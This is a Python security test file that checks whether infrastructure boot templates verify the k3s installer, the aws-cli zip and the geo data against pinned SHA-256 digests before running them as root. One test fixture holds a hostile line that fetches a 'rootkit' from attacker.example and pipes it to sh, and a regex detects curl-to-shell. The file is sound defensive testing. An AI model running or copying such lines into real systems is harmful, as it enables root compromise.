"""Security tests: VULN-024, VULN-025, VULN-034 — unverified downloads run as root.

CWE-494. Three artifacts reached root execution at boot with nothing standing between
the network and the node:

  VULN-024  `curl -sfL https://get.k3s.io | sh -` executes whatever the endpoint
            returns, leaving no record of what ran.
  VULN-025  the aws-cli zip was unpacked and `./aws/install` run as root.
  VULN-034  geoip.dat/dlc.dat were checked against a .sha256sum fetched from the
            same mutable release path as the artifact, which proves transport
            integrity and nothing else: whatever serves a modified .dat serves a
            matching sum.

Per the operator's decision all three are pinned as Terraform variables, matching
the pattern already used for conduit, xray, alloy and spire.

The verification idiom is extracted from the templates and executed against a stub
so what is asserted is that a tampered artifact actually stops the boot — not that
a `sha256sum` line is present.
"""

import hashlib
import os
import re
import subprocess
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
CLOUD_INIT = REPO_ROOT / "cloud-init.yaml.tpl"
AWS_STARTUP = REPO_ROOT / "aws" / "scripts" / "startup.sh.tpl"
VARIABLES = REPO_ROOT / "variables.tf"
AWS_VARIABLES = REPO_ROOT / "aws" / "variables.tf"

SHA256_RE = re.compile(r"^[0-9a-f]{64}$")


def render(body: str) -> str:
    return body.replace("$${", "${").replace("%%{", "%{")


def uncommented(text: str) -> str:
    return "\n".join(l for l in text.splitlines() if not l.lstrip().startswith("#"))


def tf_default(path: Path, name: str) -> str:
    """The `default = "..."` of a variable block in a .tf file."""
    body = path.read_text()
    block = body[body.index(f'variable "{name}" {{'):]
    block = block[: block.index("\n}")]
    return re.search(r'default\s*=\s*"([^"]*)"', block).group(1)


class PinnedDigestsAreRealTest(unittest.TestCase):
    """A pin that is blank, or a placeholder, verifies nothing."""

    CASES = [
        (VARIABLES, "geoip_sha256"),
        (VARIABLES, "geosite_sha256"),
        (AWS_VARIABLES, "k3s_installer_sha256"),
        (AWS_VARIABLES, "awscli_zip_sha256"),
    ]

    def test_each_pin_is_a_sha256(self):
        for path, name in self.CASES:
            with self.subTest(variable=name):
                value = tf_default(path, name)
                self.assertRegex(
                    value, SHA256_RE,
                    f"{name} is {value!r}, which sha256sum --check cannot use")

    def test_pins_are_distinct(self):
        values = [tf_default(p, n) for p, n in self.CASES]
        self.assertEqual(len(set(values)), len(values),
                         "two artifacts share a digest — one was copy-pasted")

    def test_version_pins_accompany_the_digests(self):
        """A digest against a `latest` URL is unsatisfiable; both must be pinned."""
        for path, name in ((VARIABLES, "geoip_version"),
                           (VARIABLES, "geosite_version"),
                           (AWS_VARIABLES, "awscli_version")):
            with self.subTest(variable=name):
                self.assertNotEqual(tf_default(path, name), "",
                                    f"{name} has no pinned value")


class NoUnverifiedFetchTest(unittest.TestCase):
    """The artifact must not be reachable through a path that skips the digest."""

    def test_k3s_installer_is_not_piped_to_a_shell(self):
        body = uncommented(AWS_STARTUP.read_text())
        self.assertNotRegex(
            body, r"curl[^\n|]*get\.k3s\.io[^\n]*\|\s*(INSTALL_K3S|sh|bash)",
            "the k3s installer is still piped straight into a shell, so whatever "
            "the endpoint returns runs as root unverified")

    def test_k3s_installer_is_checked_before_it_runs(self):
        body = uncommented(AWS_STARTUP.read_text())
        check = body.index("k3s_installer_sha256")
        run = body.index('sh "$K3S_INSTALLER"')
        self.assertLess(check, run, "the digest is checked after the installer runs")

    def test_awscli_zip_url_is_versioned(self):
        body = uncommented(AWS_STARTUP.read_text())
        self.assertNotIn(
            "awscli-exe-linux-aarch64.zip", body,
            "the unversioned aws-cli URL is a moving target that no digest can "
            "describe, so the pin would break on every upstream release")
        self.assertIn("awscli-exe-linux-aarch64-${awscli_version}.zip", body,
                      "the aws-cli download is not pinned to awscli_version")

    def test_awscli_zip_is_checked_before_it_is_unpacked(self):
        body = uncommented(AWS_STARTUP.read_text())
        check = body.index("awscli_zip_sha256")
        unpack = body.index("./aws/install")
        self.assertLess(check, unpack, "the zip is installed before it is verified")

    def test_geo_data_no_longer_trusts_a_sum_from_the_release_path(self):
        body = uncommented(CLOUD_INIT.read_text())
        self.assertNotIn(
            ".sha256sum", body,
            "a checksum is still fetched from the same release path as the "
            "artifact, which proves transport integrity only")

    def test_geo_data_is_pinned_to_a_release_tag(self):
        body = uncommented(CLOUD_INIT.read_text())
        self.assertNotIn(
            "releases/latest/download", body,
            "geo data still tracks `latest`, which a fixed digest cannot describe")


class DigestCheckBehaviourTest(unittest.TestCase):
    """Execute the extracted verification idiom against good and tampered bytes.

    The fragment is rendered the way templatefile() renders it — escapes undone and
    every ${var} replaced by its variables.tf default — so what runs here is what the
    node runs. `overrides` lets a test substitute a different pin, which is how the
    accept path is exercised without shipping a 100MB fixture: if the check were a
    no-op, changing the pin would not change the outcome.
    """

    @staticmethod
    def geo_fragment(overrides=None) -> str:
        body = render(CLOUD_INIT.read_text())
        start = body.index('curl -fsSL "https://github.com/v2fly/geoip')
        tail = "mv /tmp/dlc.dat /usr/local/bin/geosite.dat"
        end = body.index(tail, start) + len(tail)
        lines = body[start:end].splitlines()
        indent = min(len(l) - len(l.lstrip()) for l in lines if l.strip())
        fragment = "\n".join(l[indent:] for l in lines)

        values = dict(overrides or {})

        def resolve(m):
            name = m.group(1)
            return values.get(name) or tf_default(VARIABLES, name)

        return re.sub(r"\$\{([a-z0-9_]+)\}", resolve, fragment)

    def run_fragment(self, served: bytes, overrides=None):
        """Run the geo-data install with curl serving `served` and mv stubbed."""
        tmp = tempfile.mkdtemp()
        binp = Path(tmp) / "bin"
        binp.mkdir()
        blob = Path(tmp) / "served.bin"
        blob.write_bytes(served)

        # curl writes the served bytes to whatever -o names.
        (binp / "curl").write_text(
            f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
            f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
            # Refuse anything but an absolute -o target, so a harness run against
            # code that pipes curl into a shell cannot drop the payload in the CWD.
            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
            f'cp "{blob}" "$out"\nexit 0\n')
        # mv into /usr/local/bin would need root; record the call instead.
        (binp / "mv").write_text(
            f'#!/usr/bin/env bash\necho "mv $*" >> "{tmp}/installed.log"\nexit 0\n')
        for f in binp.iterdir():
            f.chmod(0o755)

        p = subprocess.run(
            ["bash", "-c", "set -e\n" + self.geo_fragment(overrides)],
            capture_output=True, text=True, timeout=60, stdin=subprocess.DEVNULL,
            env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
        log = Path(tmp) / "installed.log"
        p.installed = log.read_text() if log.exists() else ""
        return p

    def test_the_fragment_carries_the_recorded_pins(self):
        """The rendered script must verify against variables.tf, not some other value."""
        fragment = self.geo_fragment()
        for name in ("geoip_sha256", "geosite_sha256"):
            with self.subTest(variable=name):
                self.assertIn(tf_default(VARIABLES, name), fragment,
                              f"the rendered fragment does not carry {name}")

    def test_an_artifact_matching_the_pin_installs(self):
        """Anchor: without this every rejection below could be an unconditional abort."""
        payload = b"stand-in for the published geo data"
        digest = hashlib.sha256(payload).hexdigest()
        p = self.run_fragment(
            payload, overrides={"geoip_sha256": digest, "geosite_sha256": digest})
        self.assertEqual(p.returncode, 0, f"a matching artifact was rejected: {p.stderr}")
        self.assertIn("geoip.dat", p.installed,
                      f"nothing was installed: {p.stderr}")
        self.assertIn("geosite.dat", p.installed,
                      f"geosite.dat was not installed: {p.stderr}")

    def test_a_tampered_artifact_stops_the_boot(self):
        """Served bytes that do not match the recorded pin must abort."""
        p = self.run_fragment(b"tampered geoip payload")
        self.assertNotEqual(
            p.returncode, 0,
            "a payload not matching the pin was accepted; the routing data Xray uses "
            "to avoid proxying back into Iranian infrastructure would be attacker-set")
        self.assertNotIn("geoip.dat", p.installed,
                         f"the tampered file was installed anyway: {p.installed}")

    def test_a_matching_geoip_does_not_carry_a_tampered_geosite(self):
        """Each artifact is checked against its own pin, not the first one to match."""
        payload = b"stand-in for the published geo data"
        digest = hashlib.sha256(payload).hexdigest()
        p = self.run_fragment(payload, overrides={"geoip_sha256": digest})
        self.assertNotEqual(p.returncode, 0, "geosite.dat skipped its own digest check")
        self.assertNotIn("geosite.dat", p.installed,
                         f"geosite.dat was installed unverified: {p.installed}")



class RootInstallBehaviourTest(unittest.TestCase):
    """Execute the extracted k3s and aws-cli install idioms against hostile bytes.

    The ordering and absence assertions above cannot tell "downloads then verifies"
    from "downloads then runs unverified with the check neutered" — a trailing
    `|| true` on the sha256sum line, or a dropped --strict, passes both. These serve
    attacker-chosen bytes and assert the root install never happens.
    """

    @staticmethod
    def fragment(start_marker: str, end_marker: str, overrides=None) -> str:
        body = render(AWS_STARTUP.read_text())
        start = body.rindex("\n", 0, body.index(start_marker)) + 1
        end = body.index(end_marker, start) + len(end_marker)
        block = body[start:end]
        values = dict(overrides or {})
        return re.sub(r"\$\{([a-z0-9_]+)\}",
                      lambda m: values.get(m.group(1)) or tf_default(AWS_VARIABLES, m.group(1)),
                      block)

    def run_k3s(self, served: bytes, overrides=None):
        tmp = Path(tempfile.mkdtemp())
        binp = tmp / "bin"
        binp.mkdir()
        (tmp / "served.bin").write_bytes(served)
        log = tmp / "ran.log"

        (binp / "curl").write_text(
            f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
            f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
            # Refuse anything but an absolute -o target, so a harness run against
            # code that pipes curl into a shell cannot drop the payload in the CWD.
            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
            f'cp "{tmp}/served.bin" "$out"\nexit 0\n')
        # `sh <installer>` is the root install. Record it instead of running it.
        (binp / "sh").write_text(f'#!/usr/bin/env bash\necho "sh $*" >> "{log}"\nexit 0\n')
        for f in binp.iterdir():
            f.chmod(0o755)

        script = ("log() { :; }\nK3S_VERSION=v1.35.5+k3s1\n"
                  + self.fragment('K3S_INSTALLER="$(umask 077; mktemp',
                                  'rm -f "$K3S_INSTALLER"', overrides))
        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
                           timeout=60, stdin=subprocess.DEVNULL,
                           env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
        p.installed = log.read_text() if log.exists() else ""
        return p

    def run_awscli(self, served: bytes, overrides=None):
        tmp = Path(tempfile.mkdtemp())
        binp = tmp / "bin"
        binp.mkdir()
        (tmp / "served.bin").write_bytes(served)
        log = tmp / "ran.log"   # outside the staging dir, which the fragment removes

        (binp / "curl").write_text(
            f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
            f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
            # Refuse anything but an absolute -o target, so a harness run against
            # code that pipes curl into a shell cannot drop the payload in the CWD.
            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
            f'cp "{tmp}/served.bin" "$out"\nexit 0\n')
        # Unpack into an ./aws/install that records being run as root.
        (binp / "unzip").write_text(
            f'#!/usr/bin/env bash\nmkdir -p aws\n'
            f'printf "#!/usr/bin/env bash\\necho \\"aws-install \\$*\\" >> {log}\\n" > aws/install\n'
            f'chmod 0755 aws/install\nexit 0\n')
        for f in binp.iterdir():
            f.chmod(0o755)

        script = ("log() { :; }\n"
                  + self.fragment('AWSCLI_DIR="$(umask 077; mktemp -d',
                                  'rm -rf "$AWSCLI_DIR"', overrides))
        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
                           timeout=60, stdin=subprocess.DEVNULL,
                           env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
        p.installed = log.read_text() if log.exists() else ""
        return p

    # ── VULN-024 ────────────────────────────────────────────────────────────

    def test_a_matching_k3s_installer_runs(self):
        """Anchor: without this the rejection below could be an unconditional abort."""
        payload = b"#!/bin/sh\n# stand-in for the published k3s installer\n"
        digest = hashlib.sha256(payload).hexdigest()
        p = self.run_k3s(payload, overrides={"k3s_installer_sha256": digest})
        self.assertEqual(p.returncode, 0, f"a matching installer was rejected: {p.stderr}")
        self.assertIn("sh ", p.installed,
                      f"the installer never ran, so nothing is being tested: {p.stderr}")

    def test_a_tampered_k3s_installer_never_executes(self):
        p = self.run_k3s(b"#!/bin/sh\ncurl attacker.example/rootkit | sh\n")
        self.assertNotEqual(p.returncode, 0, "an unverified k3s installer was accepted")
        self.assertEqual(
            p.installed, "",
            f"the tampered installer was executed as root anyway: {p.installed}")

    # ── VULN-025 ────────────────────────────────────────────────────────────

    def test_a_matching_awscli_zip_installs(self):
        """Anchor: without this the rejection below could be an unconditional abort."""
        payload = b"PK\x03\x04 stand-in for the published aws-cli zip"
        digest = hashlib.sha256(payload).hexdigest()
        p = self.run_awscli(payload, overrides={"awscli_zip_sha256": digest})
        self.assertEqual(p.returncode, 0, f"a matching zip was rejected: {p.stderr}")
        self.assertIn("aws-install", p.installed,
                      f"the installer never ran, so nothing is being tested: {p.stderr}")

    def test_a_tampered_awscli_zip_never_reaches_the_installer(self):
        p = self.run_awscli(b"PK\x03\x04 attacker-supplied archive")
        self.assertNotEqual(p.returncode, 0, "an unverified aws-cli zip was accepted")
        self.assertEqual(
            p.installed, "",
            f"./aws/install was executed as root on unverified bytes: {p.installed}")

if __name__ == "__main__":
    unittest.main()
